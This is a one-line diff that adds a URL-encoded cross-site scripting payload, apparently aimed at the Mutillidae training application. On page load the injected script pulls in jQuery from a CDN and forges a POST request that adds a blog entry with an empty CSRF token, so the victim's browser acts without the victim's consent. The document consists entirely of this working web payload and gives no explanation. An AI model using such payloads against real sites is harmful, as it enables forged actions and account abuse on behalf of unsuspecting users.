@@ -1,0 +1,1 @@
+<script%20src="http://code.jquery.com/jquery-1.9.1.js"></script><script>$(document).ready(function(){$.ajax({type:"POST",url:"index.php?page=add-to-your-blog.php",data:{"csrf-token":"","blog_entry":"Emreeeee","add-to-your-blog-php-submit-button":"Save%20Blog%20Entry"},});});</script>
